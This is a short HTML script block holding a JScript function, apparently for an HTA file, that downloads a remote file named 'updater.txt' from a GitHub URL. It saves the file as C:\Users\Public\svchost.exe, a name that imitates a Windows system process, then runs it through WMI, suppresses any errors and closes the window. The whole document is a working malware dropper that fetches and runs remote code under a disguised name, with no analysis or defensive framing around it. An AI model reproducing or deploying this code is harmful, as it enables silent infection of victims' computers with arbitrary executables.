<script language="javascript">
function execute() {
    try {
        var wmi = new ActiveXObject('WbemScripting.SWbemLocator');
        var service = wmi.ConnectServer('.', 'root/cimv2');
        var temp = '.';
        var exeUrl = 'https://raw.githubusercontent.com/AvangardSec1/docs/main/updater.txt';
        var outPath = 'C:\\Users\\Public\\svchost.exe';
        var xmlhttp = new ActiveXObject('MSXML2.ServerXMLHTTP.6.0');
        xmlhttp.open('GET', exeUrl, false);
        xmlhttp.send();
        if (xmlhttp.status == 200) {
            var stream = new ActiveXObject('ADODB.Stream');
            stream.type = 1;
            stream.open();
            stream.write(xmlhttp.responseBody);
            stream.savetofile(outPath, 2);
            stream.close();
            var process = service.get('Win32_Process');
            process.create(outPath, null, null, 0);
        }
    } catch(e) {}
    window.close();
}
</script>
